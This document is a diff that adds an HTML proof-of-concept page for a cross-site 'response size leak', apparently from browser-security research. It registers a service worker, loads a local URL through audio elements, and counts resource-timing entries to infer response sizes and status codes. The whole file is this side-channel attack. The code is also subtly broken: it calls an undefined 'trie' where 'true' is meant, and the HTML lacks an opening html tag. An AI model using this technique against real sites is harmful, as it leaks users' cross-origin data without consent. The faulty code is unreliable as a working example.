@@ -1,0 +1,45 @@
+<head>
+  <title>Response size leak</title>
+  <script>
+    if ('serviceWorker' in navigator) {
+      addEventListener('load', async () => {
+        performance.setResourceTimingBufferSize(1337);
+        const registration = await navigator.serviceWorker.register('static/serviceworker.js');
+        if (registration.installing)
+          location.reload();
+      });
+    }
+
+    async function get_diff(url, code, succeed) {
+      let start = performance.getEntries().length;
+      let sound = document.createElement('audio');
+      sound.src = `${url}?size=${succeed ? 99999 : 1}&${code}`;
+
+      return new Promise((resolve) => {
+        sound.onerror = () => {
+          let end = performance.getEntries().length;
+          return resolve(end - start);
+        }
+      });
+    }
+
+
+    async function run(url) {
+      for (let i = 100; i < 600; i++) {
+        let par = document.createElement('p');
+        var text = document.createTextNode(`${i} ${await get_diff(url, i, false)} ${await get_diff(url, i, trie)}`);
+        par.appendChild(text);
+        document.body.appendChild(par);
+      }
+    }
+    
+    onload = () => {
+      run('http://127.0.0.1:5001/static/robots.txt');
+    }
+  </script>
+</head>
+
+<body>
+</body>
+
+</html>
